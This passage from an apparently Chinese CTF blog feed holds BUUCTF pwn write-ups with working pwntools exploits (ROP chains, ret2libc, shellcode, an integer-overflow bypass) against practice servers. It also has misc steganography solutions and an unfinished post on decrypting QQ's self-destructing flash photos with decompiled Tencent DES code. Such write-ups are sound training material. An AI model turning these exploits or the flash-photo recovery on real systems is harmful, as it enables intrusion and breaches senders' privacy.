class="line">p.sendlineafter(<span class="string">&#x27;story!&#x27;</span>,payload)</span><br><span class="line">p.recv()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libcbase)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">ret_addr = <span class="number">0x004004c9</span></span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="bjdctf-2020-babystack2"><a href="#bjdctf-2020-babystack2" class="headerlink" title="bjdctf_2020_babystack2"></a>bjdctf_2020_babystack2</h1><p>整数溢出。程序先是让我们输入一个数值，之后判断是否超过10，超过就弹出警告并退出，小于就会让我们输入，大小为我们之前填的值。通过分析，我们输入的值根本不能实现栈溢出，所以我们得换一种方法。<img src="https://i.loli.net/2021/11/12/VRfZcCG2iuUlAqL.png" alt="批注 2021-11-12 105908.png"></p><p>在read读取时，会将nbytes转换为无符号数。这里补充一点知识：<strong>有符号数：上限+1=下限；下限-1=上限。无符号数：上限+1=0，所以无符号数永远没有溢出。还有一点，有符号数和无符号数的最大值是不一样的，无符号数比有符号数大到近一倍。</strong></p><p>因为一开始是有符号数我们可以输入有符号数上限+1的值：2147483648，程序判断时会将其判断成-2147483648，这样我们就可以绕过判断，之后读取时，转为无符号数就变成了2147483648，从而造成栈溢出。</p><h2 id="EXP-15"><a href="#EXP-15" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./bjdctf_2020_babystack2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28597</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;name:\n&#x27;</span>,<span class="string">&#x27;2147483648&#x27;</span>)</span><br><span class="line">ret_addr = <span class="number">0x0400599</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(ret_addr)+p64(<span class="number">0x400726</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h1><p>libc泄露，思路是一样的，直接上EXP</p><h2 id="EXP-16"><a href="#EXP-16" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_en_2&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26466</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;ciscn_2019_en_2&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.symbols[<span class="string">&quot;_start&quot;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x400c83</span></span><br><span class="line">payload1 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">p.info(<span class="string">&#x27;puts_addr==&gt;%#x&#x27;</span>,puts_addr)</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libcbase)</span><br><span class="line">system_addr = libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system_addr)</span><br><span class="line">binsh_addr=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line">ret_addr = <span class="number">0x004006b9</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">&#x27;\x00&#x27;</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-5"><a href="#ciscn-2019-n-5" class="headerlink" title="ciscn_2019_n_5"></a>ciscn_2019_n_5</h1><p>程序会先通过read函数读取输入到bss段中，之后在利用gets读取输入。因为没有输出所以不好用libc泄露，所以我们采取注入执行shellcode的方式来获取shell。首先，先生成shellcode到bss段，之后利用get跳转到这个shellcode并执行。</p><h2 id="EXP-17"><a href="#EXP-17" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_n_5&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29575</span>)</span><br><span class="line">shellcode_addr = <span class="number">0x0601080</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode=asm(shellcraft.sh())  <span class="comment"># 生成shellcode</span></span><br><span class="line">payload1 = shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tell me your name\n&#x27;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(shellcode_addr)  <span class="comment"># 跳转到shellcode</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;me?\n&#x27;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-ne-5"><a href="#ciscn-2019-ne-5" class="headerlink" title="ciscn_2019_ne_5"></a>ciscn_2019_ne_5</h1><p>程序会先让我们输入密码，密码可以直接通过IDA查看，之后会有几个选项，第一个选项是让我们输入一些东西，第二个是删除，第三个是输出，在IDA里面查看，其实还可以输入选项4，选项4才是真正的输出，选项3输出的是固定的值，选项4会输出我们之前输入的东西<img src="https://i.loli.net/2021/11/12/npa8fr7xqWS6sEl.png" alt="image.png"></p><p>进入选项4，它会将我们之前输入的值复制给dest，完事后就跳转<img src="https://i.loli.net/2021/11/12/hwPvXKuqixk79lJ.png" alt="image.png"></p><p>所以我们可以利用这个函数跳转到shellcode</p><p>所以我们的基本思路：</p><ol><li>输入密码进入选择界面</li><li>通过选项1将我们的ROP链写入进去</li><li>在通过选项3跳转到我们设计好的ROP链</li></ol><h2 id="EXP-18"><a href="#EXP-18" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&quot;i386&quot;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26828</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_ne_5&#x27;)</span></span><br><span class="line">sh_addr = <span class="number">0x080482ea</span></span><br><span class="line">sys_addr = <span class="number">0x80484D0</span></span><br><span class="line">payload1 = <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;password:&#x27;</span>,payload1)</span><br><span class="line">payload2 = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x4c</span>+p32(sys_addr)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sh_addr)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Exit\n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;info:&#x27;</span>,payload2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Exit\n&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="level2-x64"><a href="#level2-x64" class="headerlink" title="level2_x64"></a>level2_x64</h1><p>基本的ROP，直接上EXP</p><h2 id="EXP-19"><a href="#EXP-19" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29042</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./level2_x64&#x27;)</span></span><br><span class="line">binsh_addr = <span class="number">0x0600A90</span> </span><br><span class="line">system_addr = <span class="number">0x04004C0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x04006b3</span>  <span class="comment">#ROPgadget --binary level2_x64 --only &#x27;pop|ret&#x27;|grep &#x27;rdi&#x27;</span></span><br><span class="line">ret_addr = <span class="number">0x4004a1</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU misc</title>
      <link href="/post/BUU-MISC.html"/>
      <url>/post/BUU-MISC.html</url>
      
        <content type="html"><![CDATA[<h1 id="金三胖"><a href="#金三胖" class="headerlink" title="金三胖"></a>金三胖</h1><p>下载附件，打开是gif，仔细看发现gif会闪现一些字符，通过利用Stegsolve或者PS逐帧分析合并就可得到flag</p><p><img src="https://i.loli.net/2021/05/31/ZtEXme1fY8UwHIh.png" alt="image.png"></p><h1 id="二维码"><a href="#二维码" class="headerlink" title="二维码"></a>二维码</h1><p>在线扫码，得到secret is here<img src="https://i.loli.net/2021/05/31/Epm1lNvPsoIa8Xj.png" alt="image.png"></p><p>用winhex打开发现图片里面藏了压缩包，压缩包里面有一个4number.txt文件<img src="https://i.loli.net/2021/05/31/a7PysrT9jidQIxD.png" alt="image.png"></p><p>利用binwalk分离得到一个加密的文件，4number应该是提示，提示密码只有四位数，直接爆破得到密码，打开flag<img src="https://i.loli.net/2021/05/31/8gVBjHrO3ZCDJqy.png" alt="image.png"></p><h1 id="N种方法解决"><a href="#N种方法解决" class="headerlink" title="N种方法解决"></a>N种方法解决</h1><p>附件是exe文件，无法直接运行，拖进winhex里面发现是十六进制是base64编码的图片，解码得到二维码，扫码得到flag<img src="https://i.loli.net/2021/05/31/F2RNhSZXUWYTDt4.png" alt="image.png"></p><h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p>题目给了提示，是不是屏幕太小了，再看看附件，发现高度明显有问题，直接修改高度得到flag<img src="https://i.loli.net/2021/05/31/PFhSz3gIAQYWTVy.png" alt="image.png"></p><h1 id="你竟然赶我走"><a href="#你竟然赶我走" class="headerlink" title="你竟然赶我走"></a>你竟然赶我走</h1><p>签到题，将附件拖进winhex，在最下面发现flag</p><h1 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h1><p>提示密码是四位数，直接爆破，得到密码，打开发现内容被加密，猜测是base64<img src="https://i.loli.net/2021/05/31/GlDCamAKp9hgwrq.png" alt="image.png"></p><p>base64解码得到flag</p><p><img src="https://i.loli.net/2021/05/31/37SVqiBK9oNsehD.png" alt="image.png"></p><h1 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h1><p>签到题，拖进winhex拉到最底下就可以看到flag<img src="https://i.loli.net/2021/05/31/wyGEb3q8SR9fsNC.png" alt="image.png"></p><h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>根据题目名，<strong>LSB</strong>（Least Significant Bit），意为最低有效位；<strong>MSB</strong>（Most Significant Bit），意为最高有效位。使用Stegsolve<img src="https://i.loli.net/2021/05/31/c5A3vWR4oG8rhdN.png" alt="image.png"></p><p>保存，发现是一个二维码，扫码得到flag</p><h1 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h1><p>拖进winhex，使用binwalk没有发现什么东西，打开照片属性里面发现备注有flag<img src="https://i.loli.net/2021/05/31/RyiONSDtKWF62Ap.png" alt="image.png"></p><h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p>根据提示爆破，得到密码打开就是flag</p><p><img src="https://i.loli.net/2021/05/31/P6Lf4htqcjn2sSx.png" alt="image.png"></p><h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p>签到题，扫码得到flag</p><h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>看名字就知道是伪加密，拖进winhex，修改后直接打开就能得到flag<img src="https://i.loli.net/2021/06/01/FRcYDGbkQBosrCX.png" alt="image.png"></p><h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p>将文件丢进winhex，拖到最后可以看到照片里面藏了压缩包，还有一个txt文件<img src="https://i.loli.net/2021/06/01/eojuyRpP7OiG2Wc.png" alt="image.png"></p><p>直接修改后缀名，发现一个加密txt文件，根据题目提示爆破得到密码，打开文件得到flag<img src="https://i.loli.net/2021/06/01/TMgPCG619qeyc3h.png" alt="image.png"></p><h1 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h1><p>使用winhex没有发现什么东西，看到文件名盲猜使用<strong>Stegsolve</strong>修改最低有效位，果然，得到flag<img src="https://i.loli.net/2021/06/01/I5mDvbVouFsScM2.png" alt="image.png"></p><h1 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h1><p>拖进winhex，在文件最后发现有个2.txt文件，猜测里面藏了压缩包，使用binwalk分离，得到压缩包<img src="https://i.loli.net/2021/06/01/4l3ZFYtepU6azSI.png" alt="image.png"></p><p>根据提示进行爆破得到flag<img src="https://i.loli.net/2021/06/01/QHAnOD1pta6ld9o.png" alt="image.png"></p><h1 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h1><p>拖进winhex，发现里面藏有压缩包，直接改后缀名，尝试了一下，发现不是伪加密，返回照片查看，在属性备注里面发现密码，改成zip就可以看到flag了</p>]]></content>
      
      
      <categories>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>QQ闪照破解（待完结）</title>
      <link href="/post/QQ%E9%97%AA%E7%85%A7.html"/>
      <url>/post/QQ%E9%97%AA%E7%85%A7.html</url>
      
        <content type="html"><![CDATA[<blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>和朋友聊天时突发奇想，想尝试一下获取闪照源文件，忙了一个下午还是没有解决（主要是太菜了 /(ㄒoㄒ)/~~ ）</p></blockquote><h1 id="原理和思路"><a href="#原理和思路" class="headerlink" title="原理和思路"></a>原理和思路</h1><p>闪照貌似是一种木马改编而来，但是因为实用性不高可能就被设计成闪照了（盲猜）。闪照的工作原理大概是有一个FLAG_SECURE窗口，如果启用了FLAG_SECURE，那么将不允许用户在此界面截图/录屏。也就是说，不允许截图这个功能是Android系统提供给开发者的。当时间一过，程序就会自动将闪照删除。在此过程中有个很大的弊端，就是在照片还未读取时，照片会存在于缓存之中，很容易被提取出来查看。<img src="https://i.loli.net/2021/10/13/94hWsJ3cOzAQvUk.jpg" alt="v2-490e56ae39fb40e269e4b0076e8fcf43_r.jpg"></p><p>所以在2021年以前的qq，闪照基本上和普通照片没什么区别，只要在缓存中提取到就可以保存起来。但是现在已经被修复了，网上大部分教程已经失效了。（可能某些大佬自己破解了，只是我不知道）。现在的闪照在缓存中提取到改后缀已经没有用了，因为现在的照片已经被加密了（文件头就写着加密二字😒）</p><p>接下来就是讲讲我自己的思路：</p><p>1、首先找到缓冲区文件，路径（Andriod/data/com.tecent.mobileqq/Tencent/MobileQQ/chatpic/chatimg），里面的东西应该和下面差不多（如果找不到可能是没有打开显示隐藏文件。），之后按照时间顺序找到对应的文件。<img src="https://i.loli.net/2021/10/13/bcLsOGxe7SrHBPq.jpg" alt="QQ图片20211013192450.jpg"></p><p>当初找到以后高兴了老半天，结果打开发现被加密了，气的想打人。后面看到一个大佬讲解，发现是des加密（就知道腾讯不会勤快到自己写出算法）他通过TIM2.1.0的apk反编译了一下，发现com.tencent.mobileqq.utils.DESUtil中有几个函数可以加解密闪照图片，发现使用的是javax.crypto加解密。</p><p>这个类大概就是下面这个样子，其中byte[]参数是加解密的key</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_123.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">package</span> com.tencent.mobileqq.utils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tencent.mobileqq.utils.FileUtils;</span><br><span class="line"><span class="keyword">import</span> com.tencent.qphone.base.util.QLog;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"><span class="keyword">import</span> java.io.UnsupportedEncodingException;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.CipherInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.CipherOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DESUtil</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">a</span><span class="params">(File var0, File var1_6, <span class="keyword">byte</span>[] var2_8)</span> </span>&#123;</span><br><span class="line"><span class="comment">//加密</span></span><br><span class="line">        var6_15 = <span class="keyword">new</span> SecretKeySpec(DESUtil.a((<span class="keyword">byte</span>[])var2_8), <span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var2_8 = Cipher.getInstance(<span class="string">&quot;DES&quot;</span>);</span><br><span class="line">        var2_8.init(<span class="number">1</span>, (Key)var6_15);</span><br><span class="line">        var6_15 = <span class="keyword">new</span> FileInputStream((File)var0);</span><br><span class="line">        var0 = <span class="keyword">new</span> FileOutputStream((File)var1_6);</span><br><span class="line">        var1_6 = <span class="keyword">new</span> CipherInputStream((InputStream)var6_15, (Cipher)var2_8);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2_8 = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            var0.write(<span class="string">&quot;ENCRYPT:&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));<span class="comment">//写文件头</span></span><br><span class="line">            <span class="keyword">while</span> ((var3_16 = var1_6.read((<span class="keyword">byte</span>[])var2_8)) != -<span class="number">1</span>) 